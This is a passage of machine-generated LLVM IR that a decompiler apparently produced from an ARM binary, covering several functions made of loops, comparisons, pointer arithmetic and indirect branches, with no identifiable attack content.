  %v3_e96c = icmp uge i32 %v2_e968, %v1_e96c.pre
  store i1 %v3_e96c, i1* %cpsr_c.global-to-local, align 1
  %v9_e96c = icmp eq i32 %v2_e968, %v1_e96c.pre
  br i1 %v9_e96c, label %dec_label_pc_e974, label %dec_label_pc_e98c

dec_label_pc_e988:                                ; preds = %dec_label_pc_e974
  %v0_e988 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e98c

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e958, %dec_label_pc_e974.dec_label_pc_e968_crit_edge, %dec_label_pc_e988
  %v0_e98c = phi i32 [ %v0_e988, %dec_label_pc_e988 ], [ %v2_e96824, %dec_label_pc_e958 ], [ %v2_e968, %dec_label_pc_e974.dec_label_pc_e968_crit_edge ]
  %v1_e98c = phi i32 [ %v0_e988, %dec_label_pc_e988 ], [ %v0_e958, %dec_label_pc_e958 ], [ %v1_e96c.pre, %dec_label_pc_e974.dec_label_pc_e968_crit_edge ]
  %v3_e98c = icmp uge i32 %v0_e98c, %v1_e98c
  store i1 %v3_e98c, i1* %cpsr_c.global-to-local, align 1
  %v9_e98c = icmp eq i32 %v0_e98c, %v1_e98c
  br i1 %v9_e98c, label %dec_label_pc_e9b4.preheader, label %dec_label_pc_e98c.dec_label_pc_e958_crit_edge

dec_label_pc_e98c.dec_label_pc_e958_crit_edge:    ; preds = %dec_label_pc_e98c
  %v0_e964.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e958

dec_label_pc_e9b4.preheader:                      ; preds = %dec_label_pc_e98c
  %v0_e9b41 = load i32, i32* %r7.global-to-local, align 4
  %v1_e9b42 = and i32 %v0_e9b41, 12
  store i32 %v1_e9b42, i32* @r3, align 4
  %v2_e9b83 = icmp ugt i32 %v1_e9b42, 3
  store i1 %v2_e9b83, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b85 = icmp eq i32 %v1_e9b42, 4
  br i1 %v7_e9b85, label %dec_label_pc_e998.lr.ph, label %dec_label_pc_e9b4.preheader.dec_label_pc_e9c0.loopexit_crit_edge

dec_label_pc_e9b4.preheader.dec_label_pc_e9c0.loopexit_crit_edge: ; preds = %dec_label_pc_e9b4.preheader
  %v1_e9c4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e9c0.loopexit

dec_label_pc_e998.lr.ph:                          ; preds = %dec_label_pc_e9b4.preheader
  %v0_e99c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_e99c = add i32 %v0_e99c.pre, 132
  %v2_e9b0 = inttoptr i32 %v1_e99c to i32*
  br label %dec_label_pc_e998

dec_label_pc_e998:                                ; preds = %dec_label_pc_e998.lr.ph, %dec_label_pc_e998
  %v0_e998 = phi i32 [ %v0_e9b41, %dec_label_pc_e998.lr.ph ], [ %v3_e9b0, %dec_label_pc_e998 ]
  store i32 %v0_e998, i32* @r2, align 4
  store i32 %v1_e99c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_e9b0 = load i32, i32* %v2_e9b0, align 4
  store i32 %v3_e9b0, i32* %r7.global-to-local, align 4
  %v1_e9b4 = and i32 %v3_e9b0, 12
  store i32 %v1_e9b4, i32* @r3, align 4
  %v7_e9b8 = icmp eq i32 %v1_e9b4, 4
  br i1 %v7_e9b8, label %dec_label_pc_e998, label %dec_label_pc_e9b4.dec_label_pc_e9c0.loopexit_crit_edge

dec_label_pc_e9b4.dec_label_pc_e9c0.loopexit_crit_edge: ; preds = %dec_label_pc_e998
  %v2_e9b8 = icmp ugt i32 %v1_e9b4, 3
  store i1 %v2_e9b8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_e9c0.loopexit

dec_label_pc_e9c0.loopexit:                       ; preds = %dec_label_pc_e9b4.preheader.dec_label_pc_e9c0.loopexit_crit_edge, %dec_label_pc_e9b4.dec_label_pc_e9c0.loopexit_crit_edge
  %v1_e9c4.pre = phi i32 [ %v1_e9c4.pre.pre, %dec_label_pc_e9b4.preheader.dec_label_pc_e9c0.loopexit_crit_edge ], [ %v1_e99c, %dec_label_pc_e9b4.dec_label_pc_e9c0.loopexit_crit_edge ]
  %v2_e9c0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_e9c0

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e9c0.loopexit, %dec_label_pc_e940
  %v1_e9c4 = phi i32 [ %v1_e9c4.pre, %dec_label_pc_e9c0.loopexit ], [ %v0_e940, %dec_label_pc_e940 ]
  %v2_e9c0 = phi i32 [ %v2_e9c0.pre, %dec_label_pc_e9c0.loopexit ], [ %v3_e944, %dec_label_pc_e940 ]
  store i32 %v2_e9c0, i32* @r4, align 4
  ret i32 %v1_e9c4

; uselistorder directives
  uselistorder i32 %v3_e9b0, { 1, 2, 0 }
  uselistorder i32 %v1_e99c, { 0, 2, 1 }
  uselistorder i32 %v0_e988, { 1, 0 }
  uselistorder i32 %v1_e96c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_e958, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 1, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_e9c0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e998, { 1, 0 }
  uselistorder label %dec_label_pc_e98c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e974, { 1, 0 }
}

define i32 @function_e9c8() local_unnamed_addr {
dec_label_pc_e9c8:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e9c8 = load i32, i32* @r4, align 4
  store i32 %v3_e9c8, i32* %stack_var_-24, align 4
  store i32 59548, i32* %r8.global-to-local, align 4
  %v0_e9d0 = call i32 @function_f150()
  %v1_e9d4 = add i32 %v0_e9d0, -1036
  %v2_e9d4 = inttoptr i32 %v1_e9d4 to i32*
  %v3_e9d4 = load i32, i32* %v2_e9d4, align 4
  store i32 %v3_e9d4, i32* %r6.global-to-local, align 4
  %v1_e9d8 = add i32 %v0_e9d0, -1168
  store i32 %v1_e9d8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r8.global-to-local, align 4
  %v1_e9e046 = or i32 %v3_e9d4, 2
  store i32 %v1_e9e046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_e9e449 = icmp eq i32 %v1_e9e046, %v3_e9d4
  br i1 %v9_e9e449, label %dec_label_pc_ea90, label %dec_label_pc_e9ec

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e9c8, %bb.dec_label_pc_e9ec_crit_edge
  %v0_e9f0 = phi i32 [ %v0_e9f0.pre, %bb.dec_label_pc_e9ec_crit_edge ], [ %v1_e9d8, %dec_label_pc_e9c8 ]
  %v1_e9e051 = phi i32 [ %v1_e9e0, %bb.dec_label_pc_e9ec_crit_edge ], [ %v1_e9e046, %dec_label_pc_e9c8 ]
  %v0_e9f450 = phi i32 [ %v1_ea20, %bb.dec_label_pc_e9ec_crit_edge ], [ %v3_e9d4, %dec_label_pc_e9c8 ]
  store i32 %v1_e9e051, i32* @r1, align 4
  %v1_e9f0 = add i32 %v0_e9f0, 132
  store i32 %v1_e9f0, i32* %r2.global-to-local, align 4
  store i32 %v0_e9f450, i32* %r4.global-to-local, align 4
  %v1_e9f834 = inttoptr i32 %v1_e9f0 to i32*
  %v2_e9f835 = load i32, i32* %v1_e9f834, align 4
  store i32 %v2_e9f835, i32* @r3, align 4
  %v3_e9fc37 = icmp uge i32 %v2_e9f835, %v0_e9f450
  store i1 %v3_e9fc37, i1* %cpsr_c.global-to-local, align 1
  %v9_e9fc43 = icmp eq i32 %v2_e9f835, %v0_e9f450
  br i1 %v9_e9fc43, label %dec_label_pc_ea04, label %dec_label_pc_ea1c

dec_label_pc_ea04:                                ; preds = %dec_label_pc_e9ec, %dec_label_pc_ea04.dec_label_pc_e9f8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_ea14 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ea14, label %dec_label_pc_ea18, label %dec_label_pc_ea04.dec_label_pc_e9f8_crit_edge

dec_label_pc_ea04.dec_label_pc_e9f8_crit_edge:    ; preds = %dec_label_pc_ea04
  %v0_e9f8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_e9fc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e9f8 = inttoptr i32 %v0_e9f8.pre to i32*
  %v2_e9f8 = load i32, i32* %v1_e9f8, align 4
  store i32 %v2_e9f8, i32* @r3, align 4
  %v3_e9fc = icmp uge i32 %v2_e9f8, %v1_e9fc.pre
  store i1 %v3_e9fc, i1* %cpsr_c.global-to-local, align 1
  %v9_e9fc = icmp eq i32 %v2_e9f8, %v1_e9fc.pre
  br i1 %v9_e9fc, label %dec_label_pc_ea04, label %dec_label_pc_ea1c

dec_label_pc_ea18:                                ; preds = %dec_label_pc_ea04
  %v0_ea18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ea18, i32* @r3, align 4
  br label %dec_label_pc_ea1c

dec_label_pc_ea1c:                                ; preds = %dec_label_pc_e9ec, %dec_label_pc_ea04.dec_label_pc_e9f8_crit_edge, %dec_label_pc_ea18
  %v1_ea20 = phi i32 [ %v0_ea18, %dec_label_pc_ea18 ], [ %v2_e9f835, %dec_label_pc_e9ec ], [ %v2_e9f8, %dec_label_pc_ea04.dec_label_pc_e9f8_crit_edge ]
  %v1_ea1c = load i32, i32* %r6.global-to-local, align 4
  %v3_ea1c = icmp uge i32 %v1_ea20, %v1_ea1c
  store i1 %v3_ea1c, i1* %cpsr_c.global-to-local, align 1
  %v9_ea1c = icmp eq i32 %v1_ea20, %v1_ea1c
  br i1 %v9_ea1c, label %dec_label_pc_ea28, label %bb

bb:                                               ; preds = %dec_label_pc_ea1c
  store i32 %v1_ea20, i32* %r6.global-to-local, align 4
  %v1_e9e0 = or i32 %v1_ea20, 2
  store i32 %v1_e9e0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_e9e4 = icmp eq i32 %v1_e9e0, %v1_ea20
  br i1 %v9_e9e4, label %dec_label_pc_ea90, label %bb.dec_label_pc_e9ec_crit_edge

bb.dec_label_pc_e9ec_crit_edge:                   ; preds = %bb
  %v0_e9f0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e9ec

dec_label_pc_ea28:                                ; preds = %dec_label_pc_ea1c
  %v0_ea28 = load i32, i32* %r5.global-to-local, align 4
  %v1_ea28 = and i32 %v0_ea28, -69
  store i32 %v1_ea28, i32* @r3, align 4
  %v2_ea2c = icmp ugt i32 %v1_ea28, 9
  store i1 %v2_ea2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea2c = icmp eq i32 %v1_ea28, 10
  br i1 %v7_ea2c, label %dec_label_pc_ea34, label %dec_label_pc_ea90

dec_label_pc_ea34:                                ; preds = %dec_label_pc_ea28
  %v1_ea38 = load i32, i32* %r7.global-to-local, align 4
  %v2_ea38 = add i32 %v1_ea38, 544
  %v3_ea38 = inttoptr i32 %v2_ea38 to i32*
  store i32 -1, i32* %v3_ea38, align 4
  %v0_ea3c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ea3c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ea40

dec_label_pc_ea40:                                ; preds = %dec_label_pc_ea74.dec_label_pc_ea40_crit_edge, %dec_label_pc_ea34
  %v0_ea44 = phi i32 [ %v0_ea44.pre, %dec_label_pc_ea74.dec_label_pc_ea40_crit_edge ], [ %v0_ea3c, %dec_label_pc_ea34 ]
  %v0_ea40 = load i32, i32* %r7.global-to-local, align 4
  %v1_ea40 = add i32 %v0_ea40, 132
  %v2_ea40 = inttoptr i32 %v1_ea40 to i32*
  %v3_ea40 = load i32, i32* %v2_ea40, align 4
  store i32 %v0_ea44, i32* %r2.global-to-local, align 4
  store i32 %v3_ea40, i32* %r4.global-to-local, align 4
  %v1_ea4c = or i32 %v3_ea40, 16
  store i32 %v1_ea4c, i32* @r1, align 4
  %v1_ea5022 = inttoptr i32 %v0_ea44 to i32*
  %v2_ea5023 = load i32, i32* %v1_ea5022, align 4
  %v3_ea5425 = icmp uge i32 %v2_ea5023, %v3_ea40
  store i1 %v3_ea5425, i1* %cpsr_c.global-to-local, align 1
  %v9_ea5431 = icmp eq i32 %v2_ea5023, %v3_ea40
  br i1 %v9_ea5431, label %dec_label_pc_ea5c, label %dec_label_pc_ea74

dec_label_pc_ea5c:                                ; preds = %dec_label_pc_ea40, %dec_label_pc_ea5c.dec_label_pc_ea50_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_ea6c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ea6c, label %dec_label_pc_ea70, label %dec_label_pc_ea5c.dec_label_pc_ea50_crit_edge

dec_label_pc_ea5c.dec_label_pc_ea50_crit_edge:    ; preds = %dec_label_pc_ea5c
  %v0_ea50.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ea54.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_ea50 = inttoptr i32 %v0_ea50.pre to i32*
  %v2_ea50 = load i32, i32* %v1_ea50, align 4
  %v3_ea54 = icmp uge i32 %v2_ea50, %v1_ea54.pre
  store i1 %v3_ea54, i1* %cpsr_c.global-to-local, align 1
  %v9_ea54 = icmp eq i32 %v2_ea50, %v1_ea54.pre
  br i1 %v9_ea54, label %dec_label_pc_ea5c, label %dec_label_pc_ea74

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea5c
  %v0_ea70 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ea74

dec_label_pc_ea74:                                ; preds = %dec_label_pc_ea40, %dec_label_pc_ea5c.dec_label_pc_ea50_crit_edge, %dec_label_pc_ea70
  %v0_ea74 = phi i32 [ %v0_ea70, %dec_label_pc_ea70 ], [ %v2_ea5023, %dec_label_pc_ea40 ], [ %v2_ea50, %dec_label_pc_ea5c.dec_label_pc_ea50_crit_edge ]
  %v1_ea74 = phi i32 [ %v0_ea70, %dec_label_pc_ea70 ], [ %v3_ea40, %dec_label_pc_ea40 ], [ %v1_ea54.pre, %dec_label_pc_ea5c.dec_label_pc_ea50_crit_edge ]
  %v3_ea74 = icmp uge i32 %v0_ea74, %v1_ea74
  store i1 %v3_ea74, i1* %cpsr_c.global-to-local, align 1
  %v9_ea74 = icmp eq i32 %v0_ea74, %v1_ea74
  br i1 %v9_ea74, label %dec_label_pc_ea7c, label %dec_label_pc_ea74.dec_label_pc_ea40_crit_edge

dec_label_pc_ea74.dec_label_pc_ea40_crit_edge:    ; preds = %dec_label_pc_ea74
  %v0_ea44.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ea40

dec_label_pc_ea7c:                                ; preds = %dec_label_pc_ea74
  store i32 116, i32* @r3, align 4
  %v0_ea84 = load i32, i32* %r8.global-to-local, align 4
  %v2_ea84 = add i32 %v0_ea84, 116
  %v3_ea84 = inttoptr i32 %v2_ea84 to i32*
  %v4_ea84 = load i32, i32* %v3_ea84, align 4
  call void @__pseudo_branch(i32 %v4_ea84)
  %v0_ea90.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_ea90

dec_label_pc_ea90:                                ; preds = %dec_label_pc_e9c8, %bb, %dec_label_pc_ea28, %dec_label_pc_ea7c
  %v0_ea90 = phi i32 [ %v1_ea20, %dec_label_pc_ea28 ], [ %v0_ea90.pre, %dec_label_pc_ea7c ], [ %v3_e9d4, %dec_label_pc_e9c8 ], [ %v1_ea20, %bb ]
  %v2_ea94 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_ea94, i32* @r4, align 4
  ret i32 %v0_ea90

; uselistorder directives
  uselistorder i32 %v0_ea70, { 1, 0 }
  uselistorder i32 %v1_ea54.pre, { 0, 2, 1 }
  uselistorder i32 %v1_e9e0, { 1, 2, 0 }
  uselistorder i32 %v1_ea1c, { 1, 0 }
  uselistorder i32 %v1_ea20, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_e9fc.pre, { 1, 0 }
  uselistorder i32 %v0_e9f450, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 2, 6, 10, 7, 9, 8, 1, 0 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ea90, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_ea74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ea5c, { 1, 0 }
  uselistorder label %dec_label_pc_ea1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ea04, { 1, 0 }
  uselistorder label %dec_label_pc_e9ec, { 1, 0 }
}

define i32 @function_eaa0(i32 %arg1) local_unnamed_addr {
dec_label_pc_eaa0:
  %v0_eaa0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_eaa0, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_eaa0
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_eaa0, %bb
  ret i32 0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_eaac() local_unnamed_addr {
dec_label_pc_eaac:
  ret i32 0
}

define i32 @function_eab4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_eab4:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_eab4 = add i32 %tmp, 4
  %v4_eab4 = inttoptr i32 %v3_eab4 to i32*
  store i32 %arg3, i32* %v4_eab4, align 4
  ret i32 %tmp
}

define i32 @function_eabc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_eabc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_eac0 = icmp eq i32 %arg2, 0
  br i1 %v2_eac0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_eabc
  %v2_eacc = add i32 %tmp, 4
  %v3_eacc = inttoptr i32 %v2_eacc to i32*
  %v4_eacc = load i32, i32* %v3_eacc, align 4
  store i32 %v4_eacc, i32* %r0.global-to-local, align 4
  %v3_ead0 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_eabc, %bb
  %.02 = phi i32 [ %v3_ead0, %bb ], [ undef, %dec_label_pc_eabc ]
  %v2_ead8 = xor i1 %v2_eac0, true
  call void @__pseudo_cond_branch(i1 %v2_ead8, i32 %.02)
  %v1_eae4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_eae4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_eae8() local_unnamed_addr {
dec_label_pc_eb0c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_eae8 = load i32, i32* @r4, align 4
  store i32 %v3_eae8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eb0c

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eb0c.dec_label_pc_eb0c_crit_edge, %dec_label_pc_eb0c.lr.ph
  %v1_eb0c = phi i32 [ %v1_eb18, %dec_label_pc_eb0c.dec_label_pc_eb0c_crit_edge ], [ 0, %dec_label_pc_eb0c.lr.ph ]
  %v0_eb0c = phi i32 [ %v0_eb0c.pre, %dec_label_pc_eb0c.dec_label_pc_eb0c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -8), %dec_label_pc_eb0c.lr.ph ]
  %v4_eb0c = mul i32 %v1_eb0c, 4
  %v5_eb0c = add i32 %v4_eb0c, %v0_eb0c
  %v6_eb0c = inttoptr i32 %v5_eb0c to i32*
  %v7_eb0c = load i32, i32* %v6_eb0c, align 4
  call void @__pseudo_branch(i32 %v7_eb0c)
  %v0_eb18 = load i32, i32* %r4.global-to-local, align 4
  %v1_eb18 = add i32 %v0_eb18, -1
  store i32 %v1_eb18, i32* %r4.global-to-local, align 4
  %v2_eb18 = icmp eq i32 %v0_eb18, 0
  br i1 %v2_eb18, label %dec_label_pc_eb20, label %dec_label_pc_eb0c.dec_label_pc_eb0c_crit_edge

dec_label_pc_eb0c.dec_label_pc_eb0c_crit_edge:    ; preds = %dec_label_pc_eb0c
  %v0_eb0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_eb0c

dec_label_pc_eb20:                                ; preds = %dec_label_pc_eb0c
  %v0_eb24.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_eb24 = add i32 %v0_eb24.pre, 1984
  %v3_eb24 = inttoptr i32 %v2_eb24 to i32*
  %v4_eb24 = load i32, i32* %v3_eb24, align 4
  %v2_eb28 = icmp eq i32 %v4_eb24, 0
  br i1 %v2_eb28, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_eb20
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_eb20, %bb
  %v2_eb30 = xor i1 %v2_eb28, true
  call void @__pseudo_cond_branch(i1 %v2_eb30, i32 %v4_eb24)
  %v0_eb38 = load i32, i32* %r5.global-to-local, align 4
  %v2_eb38 = add i32 %v0_eb38, 1988
  %v3_eb38 = inttoptr i32 %v2_eb38 to i32*
  %v4_eb38 = load i32, i32* %v3_eb38, align 4
  %v2_eb3c = icmp eq i32 %v4_eb38, 0
  br i1 %v2_eb3c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_eb44 = xor i1 %v2_eb3c, true
  call void @__pseudo_cond_branch(i1 %v2_eb44, i32 %v4_eb38)
  %v2_eb48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_eb48, i32* %r4.global-to-local, align 4
  %v1_eb4c = load i32, i32* @r0, align 4
  ret i32 %v1_eb4c

; uselistorder directives
  uselistorder i32 %v1_eb18, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_eb64(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_eb64:
  %v3_eb64 = load i32, i32* @r4, align 4
  %v6_eb64 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_eb78 = call i32 @function_b7ac(i32 %arg1, i32 1)
  %v3_eb80 = icmp eq i32 %v2_eb78, -1
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r3, align 4
  br i1 %v3_eb80, label %dec_label_pc_eb8c, label %dec_label_pc_eba4

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_eb64
  %v0_eb90 = load i32, i32* @r5, align 4
  %v2_eb98 = call i32 @function_e7b0(i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 -33916), i32 %v0_eb90)
  %v1_eb9c = load i32, i32* @r4, align 4
  %v1_eba0 = icmp ne i32 %v2_eb98, %v1_eb9c
  call void @__pseudo_cond_branch(i1 %v1_eba0, i32 ptrtoint (i32* @global_var_d6d4.386 to i32))
  br label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_eb64, %dec_label_pc_eb8c
  %v1_ebac = phi i32 [ %v2_eb78, %dec_label_pc_eb64 ], [ %v2_eb98, %dec_label_pc_eb8c ]
  store i32 %v3_eb64, i32* @r4, align 4
  store i32 %v6_eb64, i32* @r5, align 4
  ret i32 %v1_ebac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_eba4, { 1, 0 }
}

define i32 @function_ebb8(i32 %arg1) local_unnamed_addr {
dec_label_pc_ebb8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ebb8 = load i32, i32* @r4, align 4
  store i32 %v3_ebb8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r4.global-to-local, align 4
  %v4_ebc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 148) to i32*), align 4
  %v1_ebcc = inttoptr i32 %v4_ebc8 to i32*
  %v2_ebcc = load i32, i32* %v1_ebcc, align 4
  %v2_ebd0 = icmp eq i32 %v2_ebcc, 0
  br i1 %v2_ebd0, label %dec_label_pc_ebd8, label %dec_label_pc_ebfc

dec_label_pc_ebd8:                                ; preds = %dec_label_pc_ebb8
  store i32 4096, i32* %v1_ebcc, align 4
  %v0_ebe0 = call i32 @function_11f70()
  %v0_ebe8 = load i32, i32* %r4.global-to-local, align 4
  %v2_ebe8 = add i32 %v0_ebe8, -53016
  %v2_ebf0 = icmp eq i32 %v2_ebe8, 0
  br i1 %v2_ebf0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_ebd8
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_ebd8, %bb
  %v2_ebf8 = xor i1 %v2_ebf0, true
  call void @__pseudo_cond_branch(i1 %v2_ebf8, i32 %v2_ebe8)
  %v2_ebfc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ebfc

dec_label_pc_ebfc:                                ; preds = %dec_label_pc_ebb8, %bb4
  %v2_ebfc = phi i32 [ %v2_ebfc.pre, %bb4 ], [ %v3_ebb8, %dec_label_pc_ebb8 ]
  %.0 = phi i32 [ %v0_ebe0, %bb4 ], [ undef, %dec_label_pc_ebb8 ]
  store i32 %v2_ebfc, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_ebfc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_ec10(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_ec10:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 58960, i32* %r4.global-to-local, align 4
  %v1_ec1c = add i32 %tmp, 4
  store i32 %v1_ec1c, i32* %ip.global-to-local, align 4
  %v2_ec20 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r4.global-to-local, align 4
  %v3_ec2c = mul i32 %arg2, 4
  store i32 %v3_ec2c, i32* @r7, align 4
  %v4_ec34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 24) to i32*), align 4
  store i32 %v4_ec34, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_ec3c = add i32 %v1_ec1c, %v3_ec2c
  store i32 %v2_ec3c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %stack_var_-416, align 4
  %v4_ec44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 56) to i32*), align 4
  store i32 %v4_ec44, i32* %r4.global-to-local, align 4
  %v3_ec48 = icmp uge i32 %v2_ec3c, %v2_ec20
  store i1 %v3_ec48, i1* %cpsr_c.global-to-local, align 1
  %v9_ec48 = icmp eq i32 %v2_ec3c, %v2_ec20
  store i1 %v9_ec48, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
